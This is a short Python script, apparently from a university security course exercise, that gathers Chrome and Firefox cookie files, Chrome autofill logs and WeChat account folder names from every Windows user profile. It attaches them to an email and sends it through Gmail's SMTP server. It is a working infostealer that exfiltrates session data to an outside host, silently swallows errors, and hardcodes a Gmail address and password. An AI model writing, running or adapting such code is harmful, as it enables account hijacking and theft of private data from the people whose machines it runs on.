import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os

mail_host = 'smtp.gmail.com'  

mail_user = '6841test@gmail.com'  

mail_pass = 'UNSWcomp6841'   

sender = '6841test@gmail.com'  

receivers = [''] #fill your email address


msg = MIMEMultipart()

msg['Subject'] = 'Hi' 

msg['From'] = sender 
  
msg['To'] = receivers[0]

users=[]
for each in os.listdir(os.path.join('C:','Users')):
	if each not in ['All Users', 'Default', 'Default User', 'Default.migrated', 'desktop.ini', 'Public']:
		users.append(each)

for user in users:
	google_autofill_path = os.path.join('C:', 'Users', user, 'AppData', 'Local', 'Google', 'Chrome', 'User Data','Default', 'AutofillStrikeDatabase')
	google_cookie_path = os.path.join('C:', 'Users', user, 'AppData', 'Local', 'Google', 'Chrome', 'User Data','Default','Cookies')
	firefox_cookie_path = os.path.join('C:', 'Users', user, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles', 'Cookies.sqlite')
	wechat_path = os.path.join('C:', 'Users', user, 'Documents', 'Wechat Files')

	try:
		for i in os.listdir(google_autofill_path):
			if i.find(".log") != -1:
				google_autofill = MIMEBase("application", "octet-stream")
				with open(os.path.join(google_autofill_path, i), 'rb') as f:
					google_autofill.set_payload(f.read())
				google_autofill.add_header('Content-Disposition', 'attachment', filename='Google autofills')
				encoders.encode_base64(google_autofill)
				msg.attach(google_autofill)
	except:
		pass


	try:
		google = MIMEBase("application", "octet-stream")
		with open(google_cookie_path, 'rb') as f:
			google.set_payload(f.read())
		google.add_header('Content-Disposition', 'attachment', filename='Google Cookies')
		encoders.encode_base64(google)
		msg.attach(google)
	except:
		pass
	try:
		fox = MIMEBase("application", "octet-stream")
		with open(firefox_cookie_path, 'rb') as f:
			fox.set_payload(f.read())
		fox.add_header('Content-Disposition', 'attachment', filename='Firefox Cookies')
		encoders.encode_base64(fox)
		msg.attach(fox)
	except:
		pass

	try:
		for i in os.listdir(wechat_path):
			if i not in ['All Users', 'Applet']:
				msg.attach(MIMEText(i+'\n', 'plain'))
	except:
		pass


try:
	smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo()
	smtpserver.login(mail_user, mail_pass)
	smtpserver.sendmail(sender,receivers,msg.as_string())
	smtpserver.close()
	print('successfullly sent the mail')
except smtplib.SMTPException as e:
	print('error',e) 